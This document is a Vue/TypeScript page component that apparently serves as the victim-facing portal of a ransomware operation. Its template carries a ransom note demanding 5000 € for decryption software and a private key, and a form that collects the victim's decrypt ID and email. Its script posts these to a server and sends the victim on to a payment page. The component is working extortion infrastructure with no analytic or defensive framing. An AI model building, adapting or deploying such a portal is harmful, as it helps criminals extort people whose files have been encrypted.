<template>
    <div class="form_page">
        <div class="card w-40">
            <form class="card-form" @submit.prevent="submit(user)">
                <p v-if="error" class="card-error">
                    {{ error }}
                </p>
                <div class="input">
                    <input type="text" class="input-field" v-model="user.decryptId" placeholder="Decrypt ID" required/>
                </div>
                <div class="input">
                    <input type="text" class="input-field" v-model="user.email" placeholder="E-mail" required/>
                </div>
                <div class="action">
                    <button class="action-button">SUBMIT</button>
                </div>
            </form>
            <div class="title">
                <h2 class="title-label medium">
                    Attention ! <br/>
                    Price of software and your private key is 5000 €. With this product you can decrypt all your files, if your are willing to pay for a software product, then: <br/>
                    Deer user, <br/>
                    leave your decrypt id and email. We will contact you within twenty four hours and give further instructions. <br/>
                    You do not need to leave different electronic addresses or the same address many time
                </h2>
            </div>
        </div>
    </div>
</template>

<script lang="ts">
import { defineComponent } from 'vue';
import axios from "axios";

export default defineComponent({
    name: 'Signin',
    data() {
        return {
            user: {
                email: null,
                decryptId: null
            },
            error: null as string | null
        }
    },
    methods: {
        submit(user: any): void {
            axios.post('/signin', user)
                .then((response: any) => {
                    if(response.data.success) localStorage.setItem('deccryptId', response.data.decryptId)
                    this.$router.push('/payment')
                })
                .catch((error : any) => {
                    this.error = error.response.data.message;
                });
        }
    }
});
</script>

<style lang="scss" scoped>

</style>
